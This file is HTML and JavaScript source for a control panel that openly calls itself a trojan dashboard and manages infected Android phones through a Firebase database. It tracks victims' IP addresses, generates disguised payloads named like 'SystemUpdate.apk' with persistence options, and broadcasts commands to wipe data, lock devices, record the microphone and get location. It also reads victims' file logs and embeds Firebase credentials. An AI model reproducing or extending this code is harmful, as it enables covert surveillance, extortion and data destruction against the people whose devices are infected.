<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R | V1 TROJAN DASHBOARD</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
        .glass { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; backdrop-filter: blur(10px); }
        .neon-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .terminal-text { text-shadow: 0 0 5px #00ff00; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-6xl mx-auto">
        <!-- Header -->
        <header class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
            <div>
                <h1 class="text-3xl font-bold terminal-text">C.R V1.0 - GIGS CONTROL</h1>
                <p class="text-xs text-gray-500">Targeting System: ONLINE | User: Gigs</p>
            </div>
            <div id="status" class="px-4 py-1 rounded bg-green-900 text-green-400 text-xs animate-pulse">
                CONNECTED TO FIREBASE
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            <!-- Tool Generator Section -->
            <div class="lg:col-span-1 space-y-6">
                <div class="glass p-6 rounded-lg border-green-800 border">
                    <h2 class="text-xl mb-4 font-bold border-b border-green-900 pb-2">STUB GENERATOR</h2>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-xs mb-1">Payload Name</label>
                            <input type="text" id="payloadName" value="SystemUpdate.apk" class="w-full bg-black border border-green-900 p-2 text-sm focus:outline-none focus:border-green-400">
                        </div>
                        <div>
                            <label class="block text-xs mb-1">Target Persistence</label>
                            <select id="persistence" class="w-full bg-black border border-green-900 p-2 text-sm">
                                <option>High (Auto-restart)</option>
                                <option>Medium (Boot-start)</option>
                                <option>Low (Manual)</option>
                            </select>
                        </div>
                        <button onclick="generateStub()" class="w-full bg-green-800 hover:bg-green-600 text-black font-bold py-2 rounded transition">
                            COMPILE & LINK FIREBASE
                        </button>
                    </div>
                </div>

                <div class="glass p-6 rounded-lg border-red-900 border text-red-500">
                    <h2 class="text-xl mb-4 font-bold">QUICK COMMANDS</h2>
                    <div class="grid grid-cols-2 gap-2 text-xs">
                        <button onclick="sendCommand('WIPE')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">WIPE DATA</button>
                        <button onclick="sendCommand('LOCK')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">LOCK DEVICE</button>
                        <button onclick="sendCommand('REC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">START MIC REC</button>
                        <button onclick="sendCommand('LOC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">GET LOCATION</button>
                    </div>
                </div>
            </div>

            <!-- Monitoring Section -->
            <div class="lg:col-span-2 glass p-6 rounded-lg border-green-800 border">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-xl font-bold">VICTIM LOGS & MONITORING</h2>
                    <span id="victimCount" class="text-xs bg-green-900 px-2 py-1 rounded">Targets: 0</span>
                </div>
                
                <div class="overflow-x-auto">
                    <table class="w-full text-left text-sm">
                        <thead class="bg-green-900 text-black">
                            <tr>
                                <th class="p-2">Target ID</th>
                                <th class="p-2">IP Address</th>
                                <th class="p-2">Last Activity</th>
                                <th class="p-2">Status</th>
                                <th class="p-2">Action</th>
                            </tr>
                        </thead>
                        <tbody id="victimList">
                            <!-- Dynamic Data -->
                        </tbody>
                    </table>
                </div>

                <div class="mt-8 border-t border-green-900 pt-4">
                    <h3 class="text-lg mb-2">LIVE DATA FEED</h3>
                    <div id="liveFeed" class="bg-black p-4 h-48 overflow-y-auto border border-green-900 text-xs leading-relaxed">
                        [SYSTEM] Waiting for incoming connections...
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Config lo dipasang di sini, user.
        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab",
            measurementId: "G-WR01BDY3G6"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Listen for new victims
        database.ref('victims').on('value', (snapshot) => {
            const list = document.getElementById('victimList');
            const feed = document.getElementById('liveFeed');
            const countLabel = document.getElementById('victimCount');
            list.innerHTML = '';
            
            const data = snapshot.val();
            if (data) {
                const keys = Object.keys(data);
                countLabel.innerText = `Targets: ${keys.length}`;
                
                keys.forEach(id => {
                    const victim = data[id];
                    const row = `
                        <tr class="border-b border-gray-800 hover:bg-green-950 transition">
                            <td class="p-2 text-blue-400">${id.substring(0,8)}...</td>
                            <td class="p-2">${victim.ip || 'Unknown'}</td>
                            <td class="p-2 text-gray-400">${victim.lastSeen || 'N/A'}</td>
                            <td class="p-2"><span class="text-green-500">● Online</span></td>
                            <td class="p-2">
                                <button onclick="viewData('${id}')" class="text-xs bg-green-700 text-black px-2 py-1">VIEW DATA</button>
                            </td>
                        </tr>
                    `;
                    list.innerHTML += row;
                });
            }
        });

        function generateStub() {
            const name = document.getElementById('payloadName').value;
            const feed = document.getElementById('liveFeed');
            feed.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Compiling Stub: ${name}...</div>`;
            setTimeout(() => {
                feed.innerHTML += `<div class="text-green-400">[SUCCESS] Payload generated with Firebase DB Hook: ${firebaseConfig.databaseURL}</div>`;
                feed.scrollTop = feed.scrollHeight;
            }, 1500);
        }

        function sendCommand(cmd) {
            const feed = document.getElementById('liveFeed');
            feed.innerHTML += `<div class="text-yellow-500">[BROADCAST] Sent Command: ${cmd} to all active nodes.</div>`;
            // Logic buat nulis ke RTDB biar client baca
            database.ref('commands/global').set({
                action: cmd,
                timestamp: Date.now()
            });
            feed.scrollTop = feed.scrollHeight;
        }

        function viewData(id) {
            const feed = document.getElementById('liveFeed');
            feed.innerHTML += `<div class="text-blue-400">[FETCH] Accessing filesystem of ${id}...</div>`;
            // Fetch detailed logs here
            database.ref('logs/' + id).limitToLast(5).once('value', (snap) => {
                const logs = snap.val();
                if(logs) {
                    Object.values(logs).forEach(l => {
                        feed.innerHTML += `<div class="pl-4 text-gray-500">> ${l.message}</div>`;
                    });
                }
            });
            feed.scrollTop = feed.scrollHeight;
        }
    </script>
</body>
</html>
